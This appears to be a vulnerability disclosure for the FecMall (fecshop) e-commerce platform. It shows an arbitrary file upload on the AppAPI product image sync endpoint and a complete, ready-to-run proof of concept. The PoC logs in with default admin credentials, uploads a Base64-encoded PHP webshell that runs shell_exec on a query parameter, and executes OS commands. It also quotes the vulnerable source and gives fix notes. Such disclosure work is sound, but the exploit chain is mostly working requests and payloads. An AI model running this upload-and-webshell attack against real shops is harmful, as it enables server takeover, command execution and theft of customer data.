### Vulnerability details

**Official website / Product:** http://www.fecmall.com / FecMall (fecshop)

**Repository:** fecshop/yii2_fecshop (stars at selection: 5261)

**Vulnerability type:** file_upload / getshell

**Vulnerability versions:** master @ `19c5cb8f4848a6ef0194e3b9add050c5853cae94` (Packagist baseline 2.17.4; verified with current HEAD via path install, packaged as 2.17.5)

**Vulnerability URL / Parameter:** `POST /v1/productimage/sync` parameters `imgFileName`, `imgFileBase64Code`, `imgFileSaveRelativePath` (requires appapi `access-token`; same sink on `POST /v1/categoryimage/sync` via shared `Image::saveStreamImg`)

**Complex:** yes

### Verification procedure

1. Start the Docker lab (campaign tree `labs/fecshop-r20a8/` was cleaned; rebuild to match this topology):
   - Repo / commit: fecshop/yii2_fecshop @ `19c5cb8f4848a6ef0194e3b9add050c5853cae94` (Packagist baseline 2.17.4; path install packaged as 2.17.5)
   - Images: `nginx:1.25-alpine`, `php:7.4-fpm`, `mysql:5.7`
   - Ports: nginx host **20008→80**; mysql host **20305→3306**
   - `/etc/hosts` (or equivalent): `127.0.0.1 appapi.fecmall.test appadmin.fecmall.test img.fecmall.test`
   - Appimage document root is `@appimage/common`; the **img.fecmall.test** vhost must enable PHP-FPM (models common production where `image_domain` shares the app PHP host; without PHP on the image vhost you get arbitrary write only, not getshell)
   - Default admin/API credentials: `admin` / `admin123`
   - Expected container shape (`docker compose ps` / `docker ps`, project `fecshop-r20a8`):
     ```
     fecshop-r20a8-nginx  nginx:1.25-alpine  ...  0.0.0.0:20008->80/tcp
     fecshop-r20a8-php    php:7.4-fpm        ...  9000/tcp
     fecshop-r20a8-mysql  mysql:5.7          ...  0.0.0.0:20305->3306/tcp
     ```
2. Log in to AppAPI for an `access-token` (full messages in section A below):
   ```bash
   curl -sS -H 'Host: appapi.fecmall.test' -H 'Accept: application/json' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data 'username=admin&password=admin123' \
     http://127.0.0.1:20008/v1/account/login
   ```
   Use the JSON field `access-token` (PoC value `_1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew`; rotates on redeploy).
3. Build the PHP webshell Base64 (matches the PoC body below):
   ```bash
   # Plaintext: <?php echo "R20A8-SHELL-".(isset($_GET["c"])?shell_exec($_GET["c"]):"OK");
   # URL-encoded Base64 body field value:
   # PD9waHAgZWNobyAiUjIwQTgtU0hFTEwtIi4oaXNzZXQoJF9HRVRbImMiXSk%2Fc2hlbGxfZXhlYygkX0dFVFsiYyJdKToiT0siKTs%3D
   ```
4. Call `POST /v1/productimage/sync` with `imgFileName=cover.jpg` (passes extension allow-list), `imgFileSaveRelativePath=x/y/r20a8_poc.php` (controls saved extension), and `imgFileBase64Code` from step 3. Full message in section B.
5. API returns `save product stream img success` with `imgUrl`=`/media/catalog/product/x/y/r20a8_poc.php`.
6. Hit the image host to run OS commands (section C):
   ```bash
   curl -sS -H 'Host: img.fecmall.test' \
     'http://127.0.0.1:20008/media/catalog/product/x/y/r20a8_poc.php?c=id'
   curl -sS -H 'Host: img.fecmall.test' \
     'http://127.0.0.1:20008/media/catalog/product/x/y/r20a8_poc.php?c=uname%20-a'
   ```
   Output contains `R20A8-SHELL-uid=33(www-data)...` and kernel info — getshell.

### Complete vulnerability PoC

**A. AppAPI login for access-token**

```http
POST /v1/account/login HTTP/1.1
Host: appapi.fecmall.test
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: close

username=admin&password=admin123
```

```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Sun, 01 Nov 2026 19:39:20 GMT
Content-Type: application/json; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Vary: Accept
Access-Token: sR6k2UH2Mqd2AYqE5uPWsJ6Nr4EA5eqr
Set-Cookie: _csrf=3Pdyz5QI956jLQ36tfhBzQ3MCJZJKwDo; path=/; HttpOnly; SameSite=Lax

{"access-token":"_1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew","status":"success","code":200}
```

Use the **JSON body** `access-token` for subsequent calls (query and/or `access-token` request header; ignore any stale Access-Token response header).

**B. Arbitrary file upload (path param splits validation name vs saved name)**

Complete HTTP request (Docker-verified; connect to `127.0.0.1:20008` with Host = appapi vhost):

```http
POST /v1/productimage/sync?access-token=_1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew HTTP/1.1
Host: appapi.fecmall.test
access-token: _1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 190
Connection: close

imgFileName=cover.jpg&imgFileBase64Code=PD9waHAgZWNobyAiUjIwQTgtU0hFTEwtIi4oaXNzZXQoJF9HRVRbImMiXSk%2Fc2hlbGxfZXhlYygkX0dFVFsiYyJdKToiT0siKTs%3D&imgFileSaveRelativePath=x%2Fy%2Fr20a8_poc.php
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Sun, 01 Nov 2026 19:39:41 GMT
Content-Type: application/json; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Vary: Accept
Set-Cookie: _csrf=r6h4yY2y4vOtBL70yhaOlfXfA4O4wfMr; path=/; HttpOnly; SameSite=Lax

{"code":200,"message":"save product stream img success","data":{"imgUrl":"/media/catalog/product/x/y/r20a8_poc.php","imgRelativePath":"/x/y/r20a8_poc.php","imgFileName":"r20a8_poc.php"}}
```

Equivalent curl:

```bash
curl -sS -D- -H 'Host: appapi.fecmall.test' \
  -H 'access-token: _1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Accept: application/json' \
  --data 'imgFileName=cover.jpg&imgFileBase64Code=PD9waHAgZWNobyAiUjIwQTgtU0hFTEwtIi4oaXNzZXQoJF9HRVRbImMiXSk%2Fc2hlbGxfZXhlYygkX0dFVFsiYyJdKToiT0siKTs%3D&imgFileSaveRelativePath=x%2Fy%2Fr20a8_poc.php' \
  'http://127.0.0.1:20008/v1/productimage/sync?access-token=_1KODDJ0kcLCGrkAn-wAGLS_DJXtOoew'
```

**C. Getshell verification (execute uploaded PHP on image vhost)**

```http
GET /media/catalog/product/x/y/r20a8_poc.php?c=id HTTP/1.1
Host: img.fecmall.test
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33

R20A8-SHELL-uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```http
GET /media/catalog/product/x/y/r20a8_poc.php?c=uname%20-a HTTP/1.1
Host: img.fecmall.test
Accept: */*
Connection: close
```

```
R20A8-SHELL-Linux c6640f7d7606 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 GNU/Linux
```

Expected command output (two GETs in sequence):

```
R20A8-SHELL-uid=33(www-data) gid=33(www-data) groups=33(www-data)
R20A8-SHELL-Linux c6640f7d7606 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 GNU/Linux
```

Verification result notes:

API returned `save product stream img success` with `imgFileName` = `r20a8_poc.php`. Fetching that PHP file on the image host with `?c=id` printed `uid=33(www-data)` and `uname -a` printed kernel info — arbitrary file upload leading to getshell. Full login / upload / command HTTP is in PoC sections A–C above.

### Vulnerability analysis

The AppAPI product image sync endpoint Base64-decodes attacker content and calls `saveProductStreamImg` → `Image::saveStreamImg`. When a 3-segment `imgFileSaveRelativePath` is supplied (e.g. `a/b/name.ext`):

1. Extension allow-list is checked only against decoy `imgFileName` (e.g. `cover.jpg`);
2. On-disk filename is taken from path segment 3 (can be `r20a8_poc.php`) via `getImgSavedRelativePath`;
3. Stream write performs **no** `getimagesize` (unlike `saveUploadImg` on multipart temps), so arbitrary bytes are written under `@appimage/common` + product `imageFloder` (`media/catalog/product` in this lab);
4. Image vhost document root is `@appimage/common`; when that vhost runs PHP (common when `image_domain` shares the app PHP host), the uploaded file executes → getshell.

This is distinct from CVE-2019-17188 (admin multipart + getimagesize + `.php` name): different entry (API Base64 stream) and different bypass (split validation name vs saved name via path parameter).

Trigger / sink source (full path and line numbers; commit `19c5cb8`):

```php
# File: app/appapi/modules/V1/controllers/ProductimageController.php
# Lines: 26-84
public function actionSync()
{
    $fileName = Yii::$app->request->post('imgFileName');
    $imgFileBase64Code = Yii::$app->request->post('imgFileBase64Code');
    $imgFileSaveRelativePath = Yii::$app->request->post('imgFileSaveRelativePath');
    $errors = '';
    if (!$fileName) {
        $errors .= 'post param imgFileName is empty, ';
    }
    if (!$imgFileBase64Code) {
        $errors .= 'post param imgFileBase64Code is empty, ';
    }
    if ($errors ) {
        return [
            'code'    => 400,
            'message' => 'post param error',
            'data'    => [
                'errors' => $errors
            ],
        ];
    }
    $fileStream=base64_decode($imgFileBase64Code);
    if (!$fileStream) {
        $errors .= 'post param imgFileBase64Code is not filebase64code, ';
    }
    if ($errors ) {
        return [
            'code'    => 400,
            'message' => 'post param error',
            'data'    => [
                'errors' => $errors
            ],
        ];
    }
    list($imgSavedRelativePath, $imgUrl, $imgPath, $newName) = Yii::$service->product->image->saveProductStreamImg($fileName, $fileStream, $imgFileSaveRelativePath);
    if (!$imgUrl ||  !$imgPath) {
        return [
            'code'    => 400,
            'message' => 'save product stream img fail',
            'data'    => [
                'errors' => Yii::$service->helper->errors->get(', '),
            ],
        ];
    }
    return [
        'code'    => 200,
        'message' => 'save product stream img success',
        'data'    => [
            'imgUrl' => $imgUrl,
            'imgRelativePath' => $imgSavedRelativePath,
            'imgFileName' => $newName,
        ],
    ];
}
```

```php
# File: services/Image.php
# Lines: 249-301
public function saveStreamImg($fileName, $fileStream, $imgFileSaveRelativePath='')
{
    $imgFileSaveRelativePath = trim($imgFileSaveRelativePath, '/');
    $imgFileSaveRelativePathArr = explode('/', $imgFileSaveRelativePath);
    if ($imgFileSaveRelativePath && count($imgFileSaveRelativePathArr) == 3) {
        $newName = $imgFileSaveRelativePathArr[2];
        if (!$newName) {
            Yii::$service->helper->errors->add('generate img name fail');
            return false;
        }
        $arr = explode('.', $fileName);
        $fileType = '.'.$arr[count($arr)-1];
        $imgFileType = [
            '.jpg', '.jpeg', '.gif', '.png',
        ];
        if (!in_array($fileType, $imgFileType)) {
            // only validates $fileName suffix, not $newName / path segment 3
            Yii::$service->helper->errors->add('image file type ['.$fileType. '] is not allow ');
            return false;
        }
        $imgSavedRelativePath = $this->getImgSavedRelativePath($newName, $imgFileSaveRelativePath);
    } else {
        $newName = $this->generateImgName($fileName);
        // ... same allow-list on $fileName only ...
        $imgSavedRelativePath = $this->getImgSavedRelativePath($newName);
    }
    $fpDst = fopen($this->getCurrentBaseImgDir().$imgSavedRelativePath, "wb");
    fwrite($fpDst, $fileStream); // no getimagesize; writes by path
    fclose($fpDst);
    $imgUrl = $this->getUrlByRelativePath($imgSavedRelativePath);
    $imgPath = $this->getDirByRelativePath($imgSavedRelativePath);
    return [$imgSavedRelativePath, $imgUrl, $imgPath, $newName];
}
```

### Fix notes

1. Do not let clients choose the saved extension via `imgFileSaveRelativePath`; server must derive the name from verified image type.
2. Apply `getimagesize`/MIME + extension checks on stream uploads; require consistency.
3. Reject `..` and non-image suffixes; disable PHP execution under the image document root.
4. Patch `CategoryimageController::actionSync` which shares `saveStreamImg`.
